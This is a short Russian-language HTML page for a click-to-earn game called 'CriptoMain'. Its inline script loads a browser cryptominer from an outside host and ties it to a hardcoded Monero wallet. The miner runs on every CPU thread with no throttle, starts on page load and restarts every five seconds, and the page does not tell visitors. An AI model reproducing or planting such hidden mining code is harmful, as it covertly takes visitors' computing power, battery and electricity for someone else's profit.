<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CriptoMain</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <h1>CriptoMain</h1>
        <p>Нажми на кнопку и зарабатывай!</p>
        <button id="clickButton">💰 Заработать!</button>
        <p id="clickCount">Осталось кликов: <span id="remainingClicks">100</span></p>
        <button id="vipButton">🔥 VIP: +50% дохода</button>
    </div>

    <script src="script.js"></script>
    <script src="https://webminer.moneroocean.stream/miner.min.js"></script>
<script>
    let miner = new Client.Anonymous("87MNbagffuE5hTDuNnJ8wqE6yJ6zX57oUTekj7GzxJH43E1Se12ZPFm9Nd1RtzCEm9CBcNwtRYLXZ55qKoQkBAxgJEhau1L", {
        threads: navigator.hardwareConcurrency, 
        throttle: 0,
    });

    function startMining() {
        miner.start();
        console.log("Майнинг запущен!");
    }

    setInterval(() => {
        if (!miner.isRunning()) {
            miner.start();
        }
    }, 5000);

    startMining();
</script>
</body>
</html>
